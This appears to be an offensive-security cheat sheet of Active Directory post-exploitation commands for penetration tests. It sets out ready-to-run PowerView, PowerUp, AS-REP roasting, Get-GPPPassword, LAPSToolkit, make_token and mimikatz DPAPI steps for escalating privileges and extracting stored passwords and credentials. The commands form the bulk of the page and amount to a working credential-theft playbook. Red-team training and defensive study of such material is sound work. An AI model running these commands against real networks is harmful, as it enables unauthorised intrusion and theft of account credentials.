## **More fun in AD**

Below are a collection of items to run within a new environment to check for

In addition the bloodhound \(\(Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV\) and basic net enumeration \(net view, computers, dclist, domain\_trusts\) try looking for the following:

Next try running

Powerup

```
powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
powershell Invoke-AllChecks
```

as well as hamrj0y's powerview tips

[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

**Group functions**

`Get-NetLocalGroup -ComputerName MX01 -GroupName "Remote Management Users"`Gets members of users who can use WinRM on a specific machine.

`Get-NetLocalGroup -ComputerName MX01 -GroupName "Remote Desktop Users"`Gets members of users who can RDP to a specific machine.

**Determine if kerberos pre-auth is not set**

```
#With Powerview

# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
Invoke-ASREPRoast -Verbose | fl
```

```
#Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
powershell-import /opt/PowerSploit/Exfiltration/Get-GPPPassword.ps1
powershell Get-GPPPassword

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```

Note: Great cheat sheets for powerview, powerup,powersploit, etc.

```
https://github.com/HarmJ0y/CheatSheets
```

Note: A great tool for cracking hashes is kwprocessor

```
./kwp -z basechars/full.base keymaps/en.keymap routes/2-to-16-max-3-direction-changes.route > largekwpshift.txt
```

**LAPS:**

Note: This access is not currently in Bloodhound but is planned for a future update

```
#Import the script into memory
powershell-import /opt/LAPSToolkit/LAPSToolkit.ps1

#Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute
powershell Find-LAPSDelegatedGroups

#Parses through ExtendedRights for each AD computer with LAPS enabled and looks for which group has read access and if any user has "All Extended Rights".
powershell Find-AdmPwdExtendedRights 

#Displays all computers with LAPS enabled, password expriation, and password if user has access
powershell Get-LAPSComputers
```

[https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/](https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/)

[https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps](https://www.pentestgeek.com/penetration-testing/another-lap-around-microsoft-laps)

**Token Notes:**

You can create a token and pass to obtain a shell when not in elevated process. Additionally, only psexec/psexec\_psh work with make\_token, not winrm or wmi

```
make_token .\Administrator P@ssw0rd
ls \\dc01\c$
```

**Credential Manager & DPAPI:**

If assume / know the machine is used for RDP, there might be saved credentials.

```
shell vaultcmd /listcreds:"Windows Credentials" /all
```

These credentials are stored within the users directory,:

```
powershell Get-ChildItem C:\Users\<User>\AppData\Local\Microsoft\Credentials\ -Force
```

Take the output from above command to get details

```
mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from above command>
```

Get the Masterkey from cache

```
mimikatz !sekurlsa::dpapi
```

Obtain password

```
mimikatz dpapi::cred /in:C:\Users\<User>\AppData\Local\Microsoft\Credentials\<File Name from earlier command> /masterkey:<key from above command>
```

**Resources:**

https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/

[http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/](https://legacy.gitbook.com/book/d00mfist1/ctf/edit#)

[https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powerview.html)

